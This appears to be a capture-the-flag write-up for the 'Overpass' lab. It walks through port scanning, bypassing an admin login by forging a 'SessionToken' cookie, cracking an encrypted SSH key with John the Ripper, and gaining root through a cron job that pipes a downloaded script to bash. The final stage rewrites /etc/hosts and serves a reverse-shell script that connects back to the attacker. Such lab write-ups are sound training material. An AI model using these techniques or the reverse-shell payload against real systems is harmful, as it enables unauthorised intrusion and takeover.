
# nmap
```
root@kali:~# nmap -sV -sC -T5 -p- 10.10.15.142
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-18 01:22 UTC
Nmap scan report for ip-10-10-15-142.eu-west-1.compute.internal (10.10.15.142)
Host is up (0.030s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
MAC Address: 02:AC:5B:EE:75:14 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.98 seconds
root@kali:~#
```


# gobuster
```
admin
```

# login.js
```
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

# add cookie
- add cookie "SessionToken" value=200

```
GET /admin/ HTTP/1.1
Host: 10.10.15.142
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: SessionToken=200
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache



Welcome to the Overpass Administrator area
A secure password manager with support for Windows, Linux, MacOS and more

Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
*******************************************
-----END RSA PRIVATE KEY-----
****************************
```

# crack the pass
```
root@kali:~# ssh2john
-bash: ssh2john: command not found
root@kali:~# /usr/share/john/ssh2john.py id_rsa >id_rsa.hash
root@kali:~# john -h
Created directory: /root/.john
John the Ripper 1.9.0-jumbo-1 OMP [linux-gnu 64-bit x86_64 AVX2 AC]
Copyright (c) 1996-2019 by Solar Designer and others
Homepage: http://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]
--single[=SECTION[,..]]    "single crack" mode, using default or named rules
--single=:rule[,..]        same, using "immediate" rule(s)
--wordlist[=FILE] --stdin  wordlist mode, read words from FILE or stdin
                  --pipe   like --stdin, but bulk reads, and allows rules
--loopback[=FILE]          like --wordlist, but extract words from a .pot file
--dupe-suppression         suppress all dupes in wordlist (and force preload)
--prince[=FILE]            PRINCE mode, read words from FILE
--encoding=NAME            input encoding (eg. UTF-8, ISO-8859-1). See also
                           doc/ENCODINGS and --list=hidden-options.
--rules[=SECTION[,..]]     enable word mangling rules (for wordlist or PRINCE
                           modes), using default or named rules
--rules=:rule[;..]]        same, using "immediate" rule(s)
--rules-stack=SECTION[,..] stacked rules, applied after regular rules or to
                           modes that otherwise don't support rules
--rules-stack=:rule[;..]   same, using "immediate" rule(s)
--incremental[=MODE]       "incremental" mode [using section MODE]
--mask[=MASK]              mask mode using MASK (or default from john.conf)
--markov[=OPTIONS]         "Markov" mode (see doc/MARKOV)
--external=MODE            external mode or word filter
--subsets[=CHARSET]        "subsets" mode (see doc/SUBSETS)
--stdout[=LENGTH]          just output candidate passwords [cut at LENGTH]
--restore[=NAME]           restore an interrupted session [called NAME]
--session=NAME             give a new session the NAME
--status[=NAME]            print status of a session [called NAME]
--make-charset=FILE        make a charset file. It will be overwritten
--show[=left]              show cracked passwords [if =left, then uncracked]
--test[=TIME]              run tests and benchmarks for TIME seconds each
--users=[-]LOGIN|UID[,..]  [do not] load this (these) user(s) only
--groups=[-]GID[,..]       load users [not] of this (these) group(s) only
--shells=[-]SHELL[,..]     load users with[out] this (these) shell(s) only
--salts=[-]COUNT[:MAX]     load salts with[out] COUNT [to MAX] hashes
--costs=[-]C[:M][,...]     load salts with[out] cost value Cn [to Mn]. For
                           tunable cost parameters, see doc/OPTIONS
--save-memory=LEVEL        enable memory saving, at LEVEL 1..3
--node=MIN[-MAX]/TOTAL     this node's number range out of TOTAL count
--fork=N                   fork N processes
--pot=NAME                 pot file to use
--list=WHAT                list capabilities, see --list=help or doc/OPTIONS
--format=NAME              force hash of type NAME. The supported formats can
                           be seen with --list=formats and --list=subformats

root@kali:~# john id_rsa.hash /usr/share/wordlists/rockyou.txt
Warning: only loading hashes of type "SSH", but also saw type "tripcode"
Use the "--format=tripcode" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "descrypt"
Use the "--format=descrypt" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "pix-md5"
Use the "--format=pix-md5" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "mysql"
Use the "--format=mysql" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "oracle"
Use the "--format=oracle" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA1"
Use the "--format=Raw-SHA1" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "LM"
Use the "--format=LM" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "bfegg"
Use the "--format=bfegg" option to force loading hashes of that type instead
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Warning: only loading hashes of type "SSH", but also saw type "dynamic=md5($p)"
Use the "--format=dynamic=md5($p)" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA256"
Use the "--format=Raw-SHA256" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "HAVAL-128-4"
Use the "--format=HAVAL-128-4" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA512"
Use the "--format=HMAC-SHA512" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Tiger"
Use the "--format=Tiger" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "lotus5"
Use the "--format=lotus5" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA224"
Use the "--format=HMAC-SHA224" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "MD2"
Use the "--format=MD2" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "mdc2"
Use the "--format=mdc2" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "mscash"
Use the "--format=mscash" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "mscash2"
Use the "--format=mscash2" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA224"
Use the "--format=Raw-SHA224" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Palshop"
Use the "--format=Palshop" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "NT"
Use the "--format=NT" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "ripemd-160"
Use the "--format=ripemd-160" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Raw-MD4"
Use the "--format=Raw-MD4" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Raw-MD5"
Use the "--format=Raw-MD5" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "hMailServer"
Use the "--format=hMailServer" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Raw-MD5u"
Use the "--format=Raw-MD5u" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "ripemd-128"
Use the "--format=ripemd-128" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "gost"
Use the "--format=gost" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "Snefru-128"
Use the "--format=Snefru-128" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "ZipMonster"
Use the "--format=ZipMonster" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "bsdicrypt"
Use the "--format=bsdicrypt" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA384"
Use the "--format=HMAC-SHA384" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "oracle11"
Use the "--format=oracle11" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "xsha"
Use the "--format=xsha" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "lotus85"
Use the "--format=lotus85" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "HAVAL-256-3"
Use the "--format=HAVAL-256-3" option to force loading hashes of that type instead
Warning: only loading hashes of type "SSH", but also saw type "plaintext"
Use the "--format=plaintext" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
<pass>          (id_rsa)
```
# user
```
root@kali:~# ssh -i id_rsa james@10.10.15.142
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jul 18 02:44:24 UTC 2020

  System load:  0.08               Processes:           88
  Usage of /:   22.9% of 18.57GB   Users logged in:     0
  Memory usage: 18%                IP address for eth0: 10.10.15.142
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$
```

```
james@overpass-prod:~$ ls -al
total 48
drwxr-xr-x 6 james james 4096 Jun 27 16:07 .
drwxr-xr-x 4 root  root  4096 Jun 27 02:20 ..
lrwxrwxrwx 1 james james    9 Jun 27 02:38 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Jun 27 02:20 .bash_logout
-rw-r--r-- 1 james james 3771 Jun 27 02:20 .bashrc
drwx------ 2 james james 4096 Jun 27 04:45 .cache
drwx------ 3 james james 4096 Jun 27 04:45 .gnupg
drwxrwxr-x 3 james james 4096 Jun 27 04:20 .local
-rw-r--r-- 1 james james   49 Jun 27 04:26 .overpass
-rw-r--r-- 1 james james  807 Jun 27 02:20 .profile
drwx------ 2 james james 4096 Jun 27 04:44 .ssh
-rw-rw-r-- 1 james james  438 Jun 27 04:23 todo.txt
-rw-rw-r-- 1 james james   38 Jun 27 16:07 user.txt
james@overpass-prod:~$ cat user.txt
thm{xxxxxxx}
```


```

james@overpass-prod:~$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website


```


# root

- linpeas result
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```


- check hosts

```
james@overpass-prod:~$ ls -al /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27 02:39 /etc/hosts
james@overpass-prod:~$
```

- it says we can change overpass.thm's ip  on hosts file

```
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
<myipaddress> overpass.thm
```

- write reverse shell on my kali and start server
```
root@kali:~/http# cat downloads/src/buildscript.sh
bash -i >& /dev/tcp/<myipaddress>/1234 0>&1
root@kali:~/http#


root@kali:~/http# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.15.142 - - [18/Jul/2020 04:02:02] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -

```

```
listening on [any] 1234 ...
connect to [10.10.193.72] from (UNKNOWN) [10.10.15.142] 35894
bash: cannot set terminal process group (8239): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# ls
ls
buildStatus
builds
go
root.txt
src
root@overpass-prod:~# cat root.txt
cat root.txt
thm{XXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```
